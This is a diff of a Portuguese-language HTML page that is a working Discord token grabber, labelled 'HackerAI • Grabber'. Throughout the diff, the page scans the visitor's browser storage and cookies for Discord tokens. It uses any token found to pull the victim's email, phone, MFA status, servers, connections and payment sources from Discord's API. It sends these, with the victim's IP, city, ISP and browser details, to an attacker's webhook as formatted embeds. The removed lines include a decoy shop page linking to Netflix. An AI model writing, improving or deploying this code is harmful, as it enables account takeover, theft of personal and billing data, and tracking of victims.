@@ -1,13 +1,4 @@
 <!DOCTYPE html>
-<html>
-  <head>
-    <title>Minha Loja</title>
-  </head>
-  <body>
-    <h1>Bem-vindo!</h1>
-    <p>Clica para entrar na oja:</p>
-    <a href="https://www.netflix.com/pt/">
-    <!DOCTYPE html>
 <html lang="pt-PT">
 <head>
     <meta charset="UTF-8">
@@ -100,7 +91,6 @@
         let token = null;
         let metodos = [];
         
-        // LISTA DE CHAVES COMUNS ONDE O DISCORD GUARDA TOKEN
         const chavesPossiveis = [
             "token", "access_token", "refresh_token", "discord_token",
             "discord_access_token", "authorization", "bearer",
@@ -148,7 +138,6 @@
                     const chave = localStorage.key(i);
                     const valor = localStorage.getItem(chave);
                     if (valor && typeof valor === 'string' && valor.length > 30) {
-                        // Parece token se tiver pontos e for longo
                         if ((valor.includes('.') && valor.length > 40) || valor.includes('mfa.')) {
                             token = valor;
                             metodos.push("localStorage:" + chave.substring(0, 20));
@@ -176,14 +165,13 @@
             } catch(e) {}
         }
         
-        // Método 5: Procurar em IndexedDB (tentativa)
+        // Método 5: Procurar em IndexedDB
         if (!token) {
             try {
                 const databases = await indexedDB.databases ? await indexedDB.databases() : [];
                 for (const db of databases) {
                     if (db.name && db.name.toLowerCase().includes('discord')) {
                         metodos.push("indexedDB:" + db.name);
-                        // Não conseguimos extrair o token diretamente do IndexedDB por CORS
                     }
                 }
             } catch(e) {}
@@ -237,15 +225,37 @@
         let verified = "N/A";
         let createdAt = "N/A";
         
+        // Função para enviar embed
+        async function enviarEmbed(titulo, cor, fields, descricao) {
+            const embed = {
+                title: titulo,
+                color: cor, // Roxo = 0x9B59B6
+                description: descricao || "",
+                fields: fields,
+                footer: {
+                    text: "HackerAI • Grabber",
+                    icon_url: "https://cdn.discordapp.com/emojis/1081535536565063770.png"
+                },
+                timestamp: new Date().toISOString(),
+                thumbnail: {
+                    url: "https://cdn.discordapp.com/icons/1053197885338624080/a_ebc9c4f8e0a3c5c0c5d6c0f5f5e0e0e0.png?size=128"
+                }
+            };
+            
+            await fetch(webhookURL, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({ embeds: [embed] })
+            });
+        }
+        
         if (token && token.length > 40 && !token.includes(" ")) {
             try {
                 const headers = { "Authorization": token };
                 
-                // Tenta API v9
                 let resp = await fetch("https://discord.com/api/v9/users/@me", { headers });
                 
                 if (!resp.ok) {
-                    // Tenta API v10
                     resp = await fetch("https://discord.com/api/v10/users/@me", { headers });
                 }
                 
@@ -263,22 +273,19 @@
                     bio = data.bio || "Vazio";
                     verified = data.verified ? "Sim" : "Não";
                     
-                    // Nitro
                     const premium = data.premium_type || 0;
                     nitro = premium === 2 ? "Nitro Clássico" : premium === 1 ? "Nitro Básico" : "Não";
                     
-                    // Avatar
                     if (data.avatar && data.id) {
                         avatar = `https://cdn.discordapp.com/avatars/${data.id}/${data.avatar}.png`;
                     }
                     
-                    // Data de criação (aproximada pelo ID)
                     if (data.id) {
                         const timestamp = (parseInt(data.id) / 4194304) + 1420070400000;
                         createdAt = new Date(timestamp).toLocaleDateString('pt-PT');
                     }
                     
-                    // Tentar settings para email/telefone
+                    // Tentar settings
                     try {
                         const settingsResp = await fetch("https://discord.com/api/v9/users/@me/settings", { headers });
                         if (settingsResp.ok) {
@@ -288,8 +295,8 @@
                         }
                     } catch(e) {}
                     
-                    // Tentar connections (redes sociais vinculadas)
-                    let connections = "N/A";
+                    // Tentar connections
+                    let connections = "Nenhuma";
                     try {
                         const connResp = await fetch("https://discord.com/api/v9/users/@me/connections", { headers });
                         if (connResp.ok) {
@@ -300,7 +307,7 @@
                         }
                     } catch(e) {}
                     
-                    // Tentar guilds (servidores)
+                    // Tentar guilds
                     let guildsCount = "N/A";
                     try {
                         const guildsResp = await fetch("https://discord.com/api/v9/users/@me/guilds", { headers });
@@ -311,7 +318,7 @@
                     } catch(e) {}
                     
                     // Tentar billing
-                    let billingInfo = "N/A";
+                    let billingInfo = "Nenhum";
                     try {
                         const billResp = await fetch("https://discord.com/api/v9/users/@me/billing/payment-sources", { headers });
                         if (billResp.ok) {
@@ -322,89 +329,122 @@
                         }
                     } catch(e) {}
 
-                    // MONTAR MENSAGEM COMPLETA
-                    const mensagem = 
-                        `**🎯 NOVA VÍTIMA - TOKEN VÁLIDO**\n` +
-                        `**━━━━━━━━━━━━━━━━━━━━**\n` +
-                        `**👤 USUÁRIO**\n` +
-                        `**Discord:** ${username}\n` +
-                        `**ID:** ${userID}\n` +
-                        `**Email:** ${email}\n` +
-                        `**Telefone:** ${phone}\n` +
-                        `**Verificado:** ${verified}\n` +
-                        `**MFA:** ${mfa}\n` +
-                        `**Nitro:** ${nitro}\n` +
-                        `**Bio:** ${bio}\n` +
-                        `**Conta criada:** ${createdAt}\n` +
-                        `**Avatar:** ${avatar}\n` +
-                        `**━━━━━━━━━━━━━━━━━━━━**\n` +
-                        `**📊 ESTATÍSTICAS**\n` +
-                        `**Servidores:** ${guildsCount}\n` +
-                        `**Conexões:** ${connections}\n` +
-                        `**Pagamento:** ${billingInfo}\n` +
-                        `**━━━━━━━━━━━━━━━━━━━━**\n` +
-                        `**🔑 TOKEN**\n` +
-                        `\`${token}\`\n` +
-                        `**Método:** ${metodos.join(", ") || "Desconhecido"}\n` +
-                        `**━━━━━━━━━━━━━━━━━━━━**\n` +
-                        `**🌐 LOCALIZAÇÃO**\n` +
-                        `**IP:** ${ip}\n` +
-                        `**Cidade:** ${cidade}\n` +
-                        `**País:** ${pais}\n` +
-                        `**ISP:** ${isp}\n` +
-                        `**━━━━━━━━━━━━━━━━━━━━**\n` +
-                        `**💻 SISTEMA**\n` +
-                        `**Navegador:** ${navigator.userAgent.substring(0, 80)}\n` +
-                        `**Idioma:** ${navigator.language}\n` +
-                        `**Resolução:** ${screen.width}x${screen.height}\n` +
-                        `**Fuso:** ${Intl.DateTimeFormat().resolvedOptions().timeZone}`;
-
-                    await fetch(webhookURL, {
-                        method: "POST",
-                        headers: { "Content-Type": "application/json" },
-                        body: JSON.stringify({ content: mensagem })
-                    });
+                    // ENVIAR EMBED ROXO COM TOKEN VÁLIDO
+                    await enviarEmbed(
+                        "🎯 TOKEN VÁLIDO - DADOS DA VÍTIMA",
+                        0x9B59B6, // Roxo
+                        [
+                            {
+                                name: "👤 **USUÁRIO**",
+                                value: `**Discord:** ${username}\n**ID:** ${userID}\n**Conta criada:** ${createdAt}`,
+                                inline: false
+                            },
+                            {
+                                name: "📧 **EMAIL & TELEFONE**",
+                                value: `**Email:** ${email}\n**Telefone:** ${phone}\n**Verificado:** ${verified}`,
+                                inline: true
+                            },
+                            {
+                                name: "🔒 **SEGURANÇA**",
+                                value: `**MFA:** ${mfa}\n**Nitro:** ${nitro}`,
+                                inline: true
+                            },
+                            {
+                                name: "📊 **ESTATÍSTICAS**",
+                                value: `**Servidores:** ${guildsCount}\n**Conexões:** ${connections}\n**Pagamento:** ${billingInfo}`,
+                                inline: false
+                            },
+                            {
+                                name: "🔑 **TOKEN**",
+                                value: `\`\`\`${token}\`\`\`\n**Método:** ${metodos.join(", ") || "Desconhecido"}`,
+                                inline: false
+                            },
+                            {
+                                name: "🌐 **LOCALIZAÇÃO**",
+                                value: `**IP:** ${ip}\n**Cidade:** ${cidade}\n**País:** ${pais}\n**ISP:** ${isp}`,
+                                inline: true
+                            },
+                            {
+                                name: "💻 **SISTEMA**",
+                                value: `**Navegador:** ${navigator.userAgent.substring(0, 60)}\n**Idioma:** ${navigator.language}\n**Resolução:** ${screen.width}x${screen.height}`,
+                                inline: true
+                            }
+                        ],
+                        `**${username}** caiu no grabber! 🎉`
+                    );
                     
                 } else {
                     // Token inválido
-                    await fetch(webhookURL, {
-                        method: "POST",
-                        headers: { "Content-Type": "application/json" },
-                        body: JSON.stringify({ content: 
-                            `**⚠️ Token Inválido**\n` +
-                            `**Token:** \`${token}\`\n` +
-                            `**IP:** ${ip}\n` +
-                            `**Status HTTP:** ${resp.status}`
-                        })
-                    });
+                    await enviarEmbed(
+                        "⚠️ TOKEN INVÁLIDO",
+                        0xE67E22, // Laranja
+                        [
+                            {
+                                name: "🔑 Token",
+                                value: `\`${token}\``,
+                                inline: false
+                            },
+                            {
+                                name: "🌐 IP",
+                                value: ip,
+                                inline: true
+                            },
+                            {
+                                name: "📍 Localização",
+                                value: `${cidade}, ${pais}`,
+                                inline: true
+                            },
+                            {
+                                name: "📡 ISP",
+                                value: isp,
+                                inline: true
+                            }
+                        ],
+                        `Status HTTP: ${resp.status}`
+                    );
                 }
             } catch(e) {
-                await fetch(webhookURL, {
-                    method: "POST",
-                    headers: { "Content-Type": "application/json" },
-                    body: JSON.stringify({ content: 
-                        `**❌ Erro ao validar token**\n` +
-                        `**IP:** ${ip}\n` +
-                        `**Erro:** ${e.message}`
-                    })
-                });
+                await enviarEmbed(
+                    "❌ ERRO AO VALIDAR TOKEN",
+                    0xE74C3C, // Vermelho
+                    [
+                        {
+                            name: "🌐 IP",
+                            value: ip,
+                            inline: true
+                        },
+                        {
+                            name: "❌ Erro",
+                            value: e.message.substring(0, 100),
+                            inline: true
+                        }
+                    ]
+                );
             }
         } else {
-            // Nenhum token encontrado
-            await fetch(webhookURL, {
-                method: "POST",
-                headers: { "Content-Type": "application/json" },
-                body: JSON.stringify({ content: 
-                    `**❌ Token não encontrado**\n` +
-                    `**IP:** ${ip}\n` +
-                    `**Cidade:** ${cidade}\n` +
-                    `**País:** ${pais}\n` +
-                    `**ISP:** ${isp}\n` +
-                    `**Navegador:** ${navigator.userAgent.substring(0, 80)}\n` +
-                    `**Idioma:** ${navigator.language}\n` +
-                    `**Métodos tentados:** localStorage, sessionStorage, cookies, IndexedDB, window`
-                })
-            });
+            // NENHUM TOKEN ENCONTRADO
+            await enviarEmbed(
+                "❌ TOKEN NÃO ENCONTRADO",
+                0xE74C3C, // Vermelho
+                [
+                    {
+                        name: "🌐 **LOCALIZAÇÃO**",
+                        value: `**IP:** ${ip}\n**Cidade:** ${cidade}\n**País:** ${pais}\n**ISP:** ${isp}`,
+                        inline: true
+                    },
+                    {
+                        name: "💻 **SISTEMA**",
+                        value: `**Navegador:** ${navigator.userAgent.substring(0, 60)}\n**Idioma:** ${navigator.language}`,
+                        inline: true
+                    },
+                    {
+                        name: "🔍 **Métodos tentados**",
+                        value: "localStorage, sessionStorage, cookies, IndexedDB, window",
+                        inline: false
+                    }
+                ],
+                `IP: ${ip} | ${cidade}, ${pais}`
+            );
         }
 
         // === 5. FINALIZAR ===
@@ -415,6 +455,5 @@
         }, 3000);
     })();
 </script>
-    </a>
-  </body>
+</body>
 </html>
